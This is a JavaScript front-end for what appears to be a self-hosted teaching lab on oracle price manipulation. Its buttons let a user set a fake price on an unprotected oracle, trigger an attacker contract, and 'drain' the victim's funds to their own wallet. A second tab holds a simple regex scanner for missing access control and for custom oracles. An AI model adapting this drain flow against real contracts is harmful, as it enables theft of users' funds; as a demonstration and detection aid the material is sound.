// ====== CONFIG: FILL THESE AFTER DEPLOYING CONTRACTS ======

const VULNERABLE_ORACLE_ADDRESS = "0x421644DC139096d9FBe89949926F1564b93C7C7F";
const VICTIM_CONTRACT_ADDRESS = "0xa6551042e0F3e9455ae7BBCE7Bb2708F5720ed69";
const ATTACKER_CONTRACT_ADDRESS = "0x304E58107bb744196cF2cF3E71037bfcFdc1B32C";

// ====== ABIs ======
const vulnerableOracleAbi = [
  "function setPrice(uint256 _price) public",
  "function getPrice() public view returns (uint256)",
];
const victimAbi = [
  "function buyTokens() public payable",
  "function sellTokens(uint256 tokenAmount) public",
  "function balances(address owner) public view returns (uint256)",
];
const attackerAbi = [
  "function attack(uint256 fakePrice) public payable",
  "function drainAndWithdraw() public",
  "function manipulatePrice(uint256 newPrice) public",
];

// ====== GLOBAL STATE ======
let provider, signer, currentAccount;

// ====== TABS & UI ======
function switchTab(tabName) {
  document.getElementById('attack-view').style.display = 'none';
  document.getElementById('scanner-view').style.display = 'none';

  if (tabName === 'attack') {
      document.getElementById('attack-view').style.display = 'grid';
  } else {
      document.getElementById('scanner-view').style.display = 'block';
  }

  // Updates the active button state
  document.querySelectorAll('.nav-btn').forEach(btn => {
      btn.classList.remove('active');
      if (btn.textContent.toLowerCase().includes(tabName)) {
          btn.classList.add('active');
      }
  });
}

function handleFileUpload(event) {
    const file = event.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (e) => document.getElementById("codeInput").value = e.target.result;
    reader.readAsText(file);
}

// ====== BLOCKCHAIN ACTIONS ======
async function connectWallet() {
  if (!window.ethereum) return alert("MetaMask not detected.");

  provider = new ethers.BrowserProvider(window.ethereum);

  try {
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    currentAccount = accounts[0];
    signer = await provider.getSigner();
    document.getElementById("connectBtn").textContent = currentAccount.slice(0,6) + "..." + currentAccount.slice(-4);
    await refreshAllViews();
  } catch (err) {
    console.error(err);
    alert("Connection failed.");
  }
}

function getContract(addr, abi, readOnly=false) {
  if(!provider) provider = new ethers.BrowserProvider(window.ethereum);
  return new ethers.Contract(addr, abi, readOnly ? provider : signer);
}

async function loadOraclePrice() {
  try {
    const c = getContract(VULNERABLE_ORACLE_ADDRESS, vulnerableOracleAbi, true);
    document.getElementById("oraclePrice").textContent = (await c.getPrice()).toString();
  } catch (e) { console.error(e); }
}

async function loadTokenBalance() {
  if (!currentAccount) return;
  try {
    const c = getContract(VICTIM_CONTRACT_ADDRESS, victimAbi, true);
    document.getElementById("tokenBalance").textContent = (await c.balances(currentAccount)).toString();
  } catch (e) { console.error(e); }
}

async function loadAttackerBalance() {
  try {
    const c = getContract(VICTIM_CONTRACT_ADDRESS, victimAbi, true);
    document.getElementById("attackerBalance").textContent = (await c.balances(ATTACKER_CONTRACT_ADDRESS)).toString();
  } catch (e) { console.error(e); }
}

async function updateOraclePrice() {
  if (!signer) return alert("Please connect wallet first.");
  try {
    const c = getContract(VULNERABLE_ORACLE_ADDRESS, vulnerableOracleAbi);
    const tx = await c.setPrice(document.getElementById("fakePriceInput").value);
    await tx.wait();
    await loadOraclePrice();
  } catch (e) {
    console.error(e);
    alert("Transaction failed. Check console for details.");
  }
}

async function buyTokens() {
  if (!signer) return alert("Please connect wallet first.");
  try {
    const c = getContract(VICTIM_CONTRACT_ADDRESS, victimAbi);
    const val = ethers.parseEther(document.getElementById("ethAmountInput").value);
    const tx = await c.buyTokens({ value: val });
    await tx.wait();
    await loadTokenBalance();
  } catch (e) {
    console.error(e);
    alert("Transaction failed. Check console for details.");
  }
}

async function runAttack() {
  if (!signer) return alert("Please connect wallet first.");
  try {
    const c = getContract(ATTACKER_CONTRACT_ADDRESS, attackerAbi);
    const price = document.getElementById("attackPriceInput").value;
    const val = ethers.parseEther(document.getElementById("attackEthInput").value);
    const tx = await c.attack(price, { value: val });
    await tx.wait();
    await refreshAllViews();
    alert("Attack Executed! Check Attacker Loot.");
  } catch (e) {
    console.error(e);
    alert("Attack failed. Check console.");
  }
}

async function cashOut() {
    if (!signer) return alert("Please connect wallet first.");
    try {
        const c = getContract(ATTACKER_CONTRACT_ADDRESS, attackerAbi);
        const tx = await c.drainAndWithdraw();
        await tx.wait();
        await refreshAllViews();
        alert("Funds drained to your wallet!");
    } catch(e) {
        console.error(e);
        alert("Cash out failed. Ensure you updated the contract code.");
    }
}

// ====== SCANNER LOGIC (TEXT ONLY) ======
function analyzeCode() {
  const code = document.getElementById("codeInput").value;
  const resultBox = document.getElementById("scanResult");
  const msgBox = document.getElementById("scanMessage");

  resultBox.style.display = "block";

  let findings = [];

  // 1. Check for public setPrice without owner check
  if (/function\s+setPrice\s*\([^)]*\)\s*public/.test(code) && !/onlyOwner|require\(\s*msg\.sender/.test(code)) {
    findings.push("[CRITICAL] 'setPrice' is public without access control. Anyone can manipulate the price.");
  }

  // 2. Check for missing Chainlink
  if (code.includes(".getPrice()") && !code.includes("AggregatorV3Interface")) {
    findings.push("[HIGH] Contract uses an insecure or custom oracle instead of Chainlink.");
  }

  // 3. Check for direct math usage
  if (code.includes("* price") || code.includes("* oracle.getPrice()")) {
    findings.push("[INFO] Price is used directly in multiplication. Verify decimals and overflow protection.");
  }

  if (findings.length > 0) {
    msgBox.innerHTML = findings.join("<br><br>");
    resultBox.style.borderColor = "#ef4444"; // Red border
    msgBox.style.color = "#fca5a5"; // Reddish text
  } else {
    msgBox.textContent = "No obvious oracle vulnerabilities found in this snippet.";
    resultBox.style.borderColor = "#22c55e"; // Green border
    msgBox.style.color = "#4ade80"; // Green text
  }
}

async function refreshAllViews() {
  await loadOraclePrice();
  await loadTokenBalance();
  await loadAttackerBalance();
}

// ====== INIT ======
window.addEventListener("DOMContentLoaded", () => {
  document.getElementById("connectBtn").addEventListener("click", connectWallet);
  document.getElementById("setPriceBtn").addEventListener("click", updateOraclePrice);
  document.getElementById("buyTokensBtn").addEventListener("click", buyTokens);
  document.getElementById("runAttackBtn").addEventListener("click", runAttack);
  document.getElementById("cashOutBtn").addEventListener("click", cashOut);

  // Scanner Listeners
  document.getElementById("scanBtn").addEventListener("click", analyzeCode);
  document.getElementById("fileUpload").addEventListener("change", handleFileUpload);
});